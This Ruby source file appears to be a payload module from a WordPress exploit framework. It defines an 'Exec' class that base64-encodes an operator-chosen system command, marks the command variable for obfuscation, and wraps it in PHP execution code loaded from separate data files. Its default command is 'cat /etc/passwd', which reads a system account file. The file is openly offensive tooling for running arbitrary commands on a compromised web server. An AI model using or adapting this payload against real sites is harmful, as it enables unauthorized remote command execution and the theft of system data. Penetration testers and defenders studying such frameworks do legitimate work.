require 'base64'

module Wpxf::Payloads
  # Executes a system command and returns the output.
  class Exec < Wpxf::Payload
    include Wpxf
    include Wpxf::Options

    def initialize
      super

      register_options([
        StringOption.new(
          name: 'cmd',
          required: true,
          default: 'cat /etc/passwd',
          desc: 'Command to run'
        )
      ])
    end

    def encoded_cmd
      Base64.strict_encode64(datastore['cmd'])
    end

    def constants
      {
        'cmd' => encoded_cmd
      }
    end

    def obfuscated_variables
      super + ['cmd']
    end

    def raw
      "#{DataFile.new('php', 'exec_methods.php').php_content}"\
      "#{DataFile.new('php', 'exec.php').php_content}"
    end
  end
end
